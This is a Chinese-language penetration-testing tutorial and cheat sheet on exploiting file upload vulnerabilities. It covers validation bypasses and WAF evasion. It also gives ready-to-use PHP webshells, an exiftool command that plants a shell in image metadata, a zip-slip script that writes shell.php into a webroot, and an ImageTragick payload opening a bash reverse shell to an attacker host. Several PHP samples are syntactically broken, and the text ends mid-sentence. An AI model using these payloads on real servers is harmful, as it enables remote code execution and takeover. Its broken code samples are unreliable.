# 文件上传漏洞

文件上传漏洞较之sql注入等漏洞，危害性往往更大。这是因为攻击者常常可以利用此类型漏洞直接上传webshell等恶意文件，直接获取机密数据或系统控制权。

这类漏洞被利用的条件如下：
- 能够上传
- 能够被某个服务器端代码解析、执行
- 能够被攻击者或用户所调用，产生非法的输出。

除了上传服务器端脚本外，还有可能上传的恶意文件有：
- Flash的策略文件 crossdomain.xml
- 病毒、木马
- 含木马的图片



## 漏洞利用
文件上传漏洞通常会与其它漏洞结合使用：
- web server 解析漏洞
- 文件包含漏洞
- 文本编辑器的上传漏洞


## 示例 

### 最简单的情况

程序未作任何验证的文件上传。


代码示例：
```php
<?php
  if (isset($_POST['Upload'])){
    $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
    $target_path = $target_path . basename($_FILES['uploaded']['name']);

    if(!move_uploaded_file($_FILES['uploaded']['tmp_name'],$target_path)){
      echo '<pre>';
      echo 'Your image was not uploaded.';
      echo '</pre>';
    }else{
      echo '<pre>';
      echo $target_path . ' successfully uploaded.';
      echo '</pre>';
    }

  }
?>
```

### 普通验证
一些网站使用了较为普通的验证content-type方法，例如限制 content-type header 内容。


进行一般验证的文件上传代码示例：
```php
<?php
  if (isset($_POST['Upload'])){
    $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
    $target_path = $target_path . basename($_FILES['uploaded']['name']);
    $uploaded_name = $_FILES['uploaded']['name']
    $uploaded_type = $_FILES['uploaded']['type']
    $uploaded_size = $_FILES['uploaded']['size']

    if(($uploaded_type == "image/jpeg")) && ($uploaded_size < 100000){

      if(!move_uploaded_file($_FILES['uploaded']['tmp_name'],$target_path)){
        echo '<pre>';
        echo 'Your image was not uploaded.';
        echo '</pre>';
      }else{
        echo '<pre>';
        echo $target_path . ' successfully uploaded.';
        echo '</pre>';
      }    
    }
  }
?>
```

这种情况，使用代理拦截http包后，将前端识别出的 content-type 修改为服务器端可接受的类型就可以绕过上述代码中的验证。因为这个网站并没有验证真实文件的内容类型。

### 文件扩展名验证
越来也多的网站开始设置文件扩展名与content-type结合型的验证。

代码示例：
```php
<?php
  if (isset($_POST['Upload'])){
    $target_path = DVWA_WEB_PAGE_TO_ROOT."hackable/uploads/";
    $target_path = $target_path . basename($_FILES['uploaded']['name']);
    $uploaded_name = $_FILES['uploaded']['name']
    $uploaded_type = $_FILES['uploaded']['type']
    $uploaded_size = $_FILES['uploaded']['size']
    $uploaded_ext = substr($uploaded_name,strrpos($uploaded_name,'.')+1);
    $flag1 = False;
    $flag2 = False;

    if(($uploaded_type == "image/jpeg")) && ($uploaded_size < 100000){
      $flag1 = True;
    }

    if (($uploaded_ext == "jpg" ||$uploaded_ext == "JPG" ||$uploaded_ext == "jpeg" ||$uploaded_ext == "JPEG" )){
      $flag2 = True;
    }
    if $flag1 && $flag2 {

      if(!move_uploaded_file($_FILES['uploaded']['tmp_name'],$target_path)){
        echo '<pre>';
        echo 'Your image was not uploaded.';
        echo '</pre>';
      }else{
        echo '<pre>';
        echo $target_path . ' successfully uploaded.';
        echo '</pre>';
      }    
    }
  }
?>
```

通过抓包、修改文件扩展名可以进行上传webshell文件。但无法直接执行。

可以考虑上传图片马。



使用`grep -R 'eval($_)' /目录`可以进行简单的检测。



## 文件上传检测防护的绕过

### 防护机制

- 客户端：
  - 采取js脚本过滤文件合法性；
- 服务器端：
  - 检查MIME类型，即content-type. 原理是读取文件的前256个字节，判断类型
  - 白名单、黑名单结合的扩展名过滤
  - 将文件置入安全沙箱进行检查
  - 随机数命名文件，防止文件重复和名字猜测。
  - 检查文件头标志位
    - 例如jpeg文件头`0xffd8 0xffe0 0x0010 0x4a46 0x4946`
  - 文件上传目录设置为不可执行
  - 单独设置文件服务器的域名

### 绕过

- 客户端的大多数黑白名单过滤机制，都可以用burpsuite等中间人进行修改、绕过。

- 服务器端绕过主要通过试验确定其检查机制，同时尝试服务器解析漏洞。

#### 黑名单绕过
若使用黑名单限制可解析的文件类型，例如禁止上传：asp，aspx, jsp,php5,php,asa，那么可以尝试：
- 上传.cer 文件（注意cer可被服务器解析，但常被黑名单所遗忘）
- 大小写变形。windows server 不区分大小写，注意 ASP 与 asp 相同，但检测机制中可能疏忽转换。
- windows系统会自动去除尾部的 `.`和空格，但服务器端web代码可能会认为`asp.`或`php.`不在限制之中。

#### 白名单绕过
若使用白名单限制，则重点考虑是否有web server 解析漏洞。

#### 目录验证
如果有迹象显示，web服务器端代码对上传的`路径+文件`进行了目录创建，那么有可能存在目录未验证漏洞。

例如有```<input type="hidden" name="Extension" value="up">```，经试验，发现 up 为可改变的一个目录名。攻击者通过burpsuite等将其改为`12.asp`,然后上传图片木马文件1.jpg。服务器端出现了`12.asp\1.jpg`，这时若服务器为IIS 6.0，则会发生解析漏洞。

#### 截断攻击

很多语言会将 0x00 作为字符串结束，例如c，php等。如果一个文件名为1.phpxxxx，通过中间代理将xx改为0x00，那么上传后就可能绕过检查且被解析。

截断上传攻击在ASP程序中很常见。

例如：有test.asp
```asp
<%
username = request("username")
Response.write username
%>
```

浏览器上输入`http://serverip/test.asp?username=xxx%00admin`,

则只会显示：`xxx`，不会显示0 之后的字符串。

类似这种情况的asp上传页面，我们构造一个webshell文件，名为`123.asp空格sss`，然后利用上传函数上传，再使用burpsuite等拦截修改空格的20为00，那么123.asp就会被解析执行。

#### 构造合法的文件头
检查MIME类型，即content-type. 原理是读取文件的前256个字节。

绕过思路可以是构造一个合法文件头，然后把php放置在其后。

```
...jpeg 合法文件头(256 bytes)....
0x3c3f 0x7068 0x7020 0x7068 ... # <?php eval($_Request("cmd"))?>
```
当然，这还需要由php server解析才能执行。

## 文本编辑器的上传漏洞

常见的文本编辑器有：
- CKEditor（FCKeditor）
- Ewebeditor
- UEditor
- KindEditor
- XHeditor

这些页面编辑器大多有图片上传、视频上传、远程下载等功能。

### FCKeditor 相关漏洞
小于2.4.3的版本大多存在下列漏洞：

#### 敏感信息暴漏
FCKeditor目录存在一些敏感文件，如果这些文件不删除，那么攻击者可以得到一些敏感信息

例如：
- 查看版本信息：`/FCKeditor/editor/dialog/fck_about.html`

#### 黑名单策略错误

- 未过滤 cer，asa等
- 事实上，.php2, .php4, inc, pwml等后缀文件都未被过滤，可以被解析执行。

#### 任意文件上传漏洞 

## 靶场
upload-lab，共19个练习，类似sqli-lab。

相关writeup也可以在github上找到。


## WAF 

### 常见检查方式
- 读取整个文件名，对比黑名单内的文件名的后缀，进行过滤
- 看目录权限，如果没有目录权限不允许上传
- 读取文件内容，检查是否为webshell
- 检查请求url中是否异常
- 检查上传文件内容

### WAF运行过程
- 读取request header，并分析
- 读取文件名
- 分析文件内容

### 识别waf
工具：
- wafw00f
- 手工测试，看误报反馈网站，进而了解厂商及版本。

## 绕过常见思路

- fuzz（可以使用fuzzdb）文件名后缀方法，用bp进行测试，寻找黑名单之外的可用文件名；
- 在文件名后追加后缀，例如`aaa.php.....`
- 路径绕过，某些waf只监控了个别目录，更改上传路径后可能成功；
- 大小写组合混淆（linux下适用）
- 尝试双引号、单引号混合，例如单双结合
- 篡改 post表单中`filename`，使其换行后提交
- 构造多个filname，尝试解析漏洞
- 添加各种空格组合
- 添加分号
- 删除获修改 `Content-Type`，例如大小写改变，内容扩充
- header中添加任意字符
- 双后缀名绕过，例如 `<scr<script>ipt>`
- 删除`form-data`
- 超长文件名获其它载荷绕过
- `Content-Disposition`
- 适用`:` `$`等特殊字符追加在文件名后尝试。
- 编辑器漏洞
- 后缀名为单独参数，例如在`content-disposition:form-data:sufix`,可以尝试修改。
- 自动更名可以尝试%00阶段，或特殊符号尝试绕过。

### 可替换的后缀
```
PHP: .php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc
ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
Jsp: .jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action
Coldfusion: .cfm, .cfml, .cfc, .dbm
Flash: .swf
Perl: .pl, .cgi
Erlang Yaws Web Server: .yaws
```
### 绕过文件扩展名检查的方法

>https://book.hacktricks.xyz/pentesting-web/file-upload

- 如果发现存在文件扩展名检查，可以尝试改变原扩展名的大小写，例如`.pHp .pHP5 .PhAr`
- 尝试在可执行扩展名前面增加一个有效扩展名，例如`file.png.php`,`file.png.Php5`
- 尝试在最后面追加特殊字符。可以使用Burpsuite枚举所有的ascii 和 unicode字符。注意，你还可以测试其它的可替换的后缀。

例如：
```
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.
file.php....
file.pHp5....
```
- 尝试通过重复后缀名或增加垃圾数据、空字节等方法欺骗服务器端的后缀解析器。

```
file.png.php
file.png.pHp5
file.php%00.png
file.php\x00.png
file.php%0a.png
file.php%0d%0a.png
flile.phpJunk123png
```
- 尝试在上面的方法中增加额外的扩展名

```
file.png.jpg.php
file.php%00.png%00.jpg
```
- 尝试在有效扩展名前放入可执行扩展名，并且期待服务器存在错误配置。例如，apache服务器错误配置就可以执行任何带.php的文件，而不一定以.php结尾）。

例如：file.php.png

- 对于windows服务器，可使用NTFS alternate data stream（ADS）。此时，将冒号：插到被禁用扩展名的后面、可用扩展名的前面，例如`file.asax:.jpg`。结果会是一个带禁用扩展名的空文件将在服务器端生成。之后，可以使用诸如它的短文件名进行编辑。`::$data`模式也可用于生成非空的文件。因此，增加一个点.字符到这个模式后面，也可能绕过更多的限制，例如`file.asp::$data.`


### 绕过 Content-Type 检查
- 绕过http头参数Content-Type的检查，可以通过bp直接修改其值.

例如：
```
image/png
image/jpg
text/plain
application/php
application/octet-stream

```
- 在文件的开始位置增加真实图像文件标志字节段（文件特征），绕过魔术数字检查。或者将shell插入metadata

例如：
```
exiftool -Comment="<?php echo 'Command:'; if($_POST['cmd']){SYSTEM($_POST['cmd']);} __halt_compiler();?>" 123_php.jpg
```
说明：如果使用bash，可能会过滤到$，这一点可以使用拦截提交的内容进行检查，这时可以在$前加转义字符，例如：
```
exiftool -Comment="<?php echo 'Command:'; if(\$_POST['cmd']){SYSTEM(\$_POST['cmd']);} __halt_compiler();?>" 123_php.jpg
```
这种提交图片的方式，需要后续使用别的方式修改后缀名，例如从 123_php.jpg 改为 123_php.php。



### 别的检查技巧

- 找到某个漏洞，修改已经上传的文件的后缀名。
- 找到一个本地文件包含漏洞，执行这个后门。
#### 可能的信息获取

- 尝试同一时间（并发），使用相同名字，多上传几次同样文件；
- 尝试上传服务器已有文件或已有的文件夹名称的文件；
- 尝试上传含有`. .. ...`等文件路径特殊字符的名称的文件，例如windows apache下，如果某个应用保存上传的文件到`/www/uploads`目录，那么“.”文件名将在"/www/"目录下生成一个名叫“uploads”的文件。
- 尝试上传一个不容易被删除的文件，例如NTFS格式下的“.....jpg”；
- 对windows服务器，尝试上传一个含有无效字符文件名的文件，例如含有`| < > * ?`等。
- 对windows服务器，尝试上传一个使用 reserved（forbidden） 名称的文件.

例如：
```
CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
```
- 尝试上传可执行文件（exe）或.html文件（不易被怀疑）等可能在受害人偶然打开时执行代码的文件。

### 特殊扩展名
- 如果你尝试上传文件到PHP服务器，那么可以考虑 [.htaccess 执行代码技巧](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess)

- 如果你尝试上传文件到ASP服务器，可以考虑 [.config执行代码技巧](https://book.hacktricks.xyz/pentesting/pentesting-web/iis-internet-information-services#execute-config-files)

- .inc 扩展名有时可用在php文件import其它文件，有时可能允许这种扩展名文件执行。

### wget 文件上传/SSRF 技巧

有时你可能碰巧遇到一个服务器使用 wget 下载文件，而且你可能指定这个URL。此时，服务器代码可能会检查下载文件的扩展名是否在白名单中。然后这个检查可能被绕过。

Linux中，文件名的最大长度是255字符，而wget truncate 文件名是236字符。 如果你下载一个名为`"A"*232+".php"+".gif"`的文件(这里以*号表示重复字符A 232次)，这个文件名将绕过检查.gif为白名单的检查，但是wget会将其更名为`"A"*232+".php`

```shell
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```shell

#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s      

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```

注意，你可能会考虑别的绕过检查的方法，使HTTP server 重定向到一个不同的文件，所以初始url需要检查，然后wget将使用新的名字下载重定向文件。

除非wget使用了--trust-server-name，否则这个不会起作用，因为wget将根据原始url中所指定的文件名来下载重定向页面。
## 从文件上传到别的漏洞


- 设置文件名为`../../../tmp/lol.png`，尝试文件路径遍历；
- 设置文件名为 `sleep(10)-- -.jpg`，可以尝试sql注入；
- 设置文件名为 `<svg onload=alert(document.cookie)>` ，可以试出xss漏洞

- 设置文件名为`; sleep 10;` 还可以使出别的[命令注入漏洞](https://book.hacktricks.xyz/pentesting-web/command-injection)

- [XSS在 image或svg 文件上传](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#xss-uploading-files-svg)
- JS 文件上传+XSS = [Service Workers 渗透](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#xss-abusing-service-workers)
- [svg 上传XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#svg-file-upload)
- [Open Redirect via uploading svg file](https://book.hacktricks.xyz/pentesting-web/open-redirect#open-redirect-uploading-svg-files)
- [著名的 ImageTrick 漏洞](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- 如果你能令某个webserver通过某个url获取一张图片，你可以尝试[SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)。如果这张image将被存放在某个公开站点，你还可以从  https://iplogger.org/invisible/ 网站给出一个url，并且窃取每个visitor的信息。
- [XXE and CORS 绕过 PDF-Adobe 上传](https://book.hacktricks.xyz/pentesting-web/file-upload/pdf-upload-xxe-and-cors-bypass)
- 特别地，可以改造PDFs为XSS：[The following page present how to inject PDF data to obtain JS execution](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/pdf-injection). If you can upload PDFs you could prepare some PDF that will execute arbitrary JS following the given indications.

下面有10个你可以用例上传的文件（from [link](https://twitter.com/SalahHasoneh1/status/1281274120395685889)）

```
ASP / ASPX / PHP5 / PHP / PHP3: Webshell / RCE
SVG: Stored XSS / SSRF / XXE
GIF: Stored XSS / SSRF
CSV: CSV injection
XML: XXE
AVI: LFI / SSRF
HTML / JS : HTML injection / XSS / Open redirect
PNG / JPEG: Pixel flood attack (DoS)
ZIP: RCE via LFI / DoS
PDF / PPTX: SSRF / BLIND XXE

```

## zip 压缩文件自动解压上传

如果你可以上传一个zip文件，需要在服务器中解压文件，你可以做2件事：

### Symlink
上传一个包含软链接的link到别的文件，然后访问这个期待访问这个linked 文件的解压文件

```shell
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
```

### 解压到不同的文件夹

通常，解压文件会放在攻击者所不期望的文件夹中，例如webroot中的某个uploads。

人们可能会简单认为这种目录设置可以防止恶意文件上传，防止执行OS级别命令，但这种想法是不对的。因为zip压缩格式支持层级化压缩，我们可以引用更高级别的目录，通过滥用解压特性，离开安全upload目录。

一个自动化渗透，生成此类文件的工具，可参考 ：https://github.com/ptoomey3/evilarc

`python evilarc.py -o unix -d 5 -p /var/www/html/ rev.php`

下面有一些生成此类恶意zip文件的python脚本：

```python
#!/usr/bin/python

import zipfile
from cStringIO import StringIO

def create_zip():
  f = StringIO()
  z = zipfile.ZipFile(f,'w',zipfile.ZIP_DEFLATED)
  z.writestr('../../../../../var/www/html/webserver/shell.php','<?php echo system($_REQUEST["cmd"]);?>')
  z.writestr('otherfile.xml','Content of the file')
  z.close()
  zip = open('poc.zip','wb')
  zip.write(f.getvalue())
  zip.close()

create_zip()

```
为了实现远程命令执行（RCE），我们可以这样做：
- 生成一个PHP shell(名为simple-backdoor.php)

```php
<?php
  if(isset($_REQUEST['cmd'])){
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
  }
?>
```

- 使用 “file spraying ” 生成一个压缩的文件

```shell
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# ls *.php
simple-backdoor.php  xxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAcmd.php        xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAcmd.php           xxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAcmd.php     xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php
xxAxxAcmd.php        xxAxxAxxAxxAxxAcmd.php  xxAxxAxxAxxAxxAxxAxxAxxAcmd.php
root@s2crew:/tmp# zip cmd.zip xx*.php
  adding: xxAcmd.php (deflated 40%)
  adding: xxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
  adding: xxAxxAxxAxxAxxAxxAxxAxxAxxAxxAcmd.php (deflated 40%)
root@s2crew:/tmp#

```
- 使用hexeditor 或 vi 改变“xxA” 为 “../"

下面以vi为例：
```
:set modifiable
:%s/xxA/..\//g
:x!
```
说明：%s表示从第一行到最后一行，也可以使用`:1,$s/xxA/..\//g`.替换命令语法为：`:n1,n2s/old_word/new_word/g`,n1为查找替换开始行，n2为查找替换结束行。

- 最后，上传zip文件（cmd.zip）到服务器，然后让应用提供的功能解压它。如果成功解压且web server有足够写权限，那么我们就可以使用这个webshell了。

参考：https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/

## 图片 tragic
如果web应用使用ImageMagick（一个创建，编辑，撰写，或转换位图图像的库），那么使用图片扩展名上传文件，可以利用ImageMagick 7.0.1-1 漏洞

```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## 将PHP shell嵌入PNG

将一个webshell放入IDAT chunk的原因是它可以绕过 resize 和 re-sampling 操作。PHP-GD 包含2个功能：[imagecopyresized ](http://php.net/manual/en/function.imagecopyresized.php)和 [imagecopyresampled](http://php.net/manual/en/function.imagecopyresampled.php) 。

参考：https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

## Polyglot 文件

Polyglot是多语言NLP工具。Polyglot is a natural language pipeline that supports massive multilingual applications.

在安全上下文中，Polyglots是一组文件，是多种不同文件类型的一个有效形式。例如，一个GIFAR既是GIF 也是RAR文件。还有的既可以是GIF 和JS，也可以是PPT和JS。

Polyglot 文件常用于绕过基于文件类型的保护。许多应用允许用户上传特定类型的文件，例如jpeg，gif，doc等等，防止用户上传危险的可执行文件，例如js，php，phar等。

Polyglot可用于组合几种不同的文件格式。它允许你上传一个PHAR文件（PHp ARchive），但看起来像一个JPEG，但是你可能仍然需要一个有效的扩展名，否则不能执行它。

更多请参考：https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a



## Reference
- fuzzdb
- githhub.com/landgrey/upload-lab
- 车王博客 http://payloads.online/archivers/2018-02-05/1
- **非常棒的教程**：https://book.hacktricks.xyz/pentesting-web/file-upload
- nikto 扫描敏感文件
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files
- https://github.com/modzero/mod0BurpUploadScanner
- https://github.com/almandin/fuxploider
From File upload to other vulnera
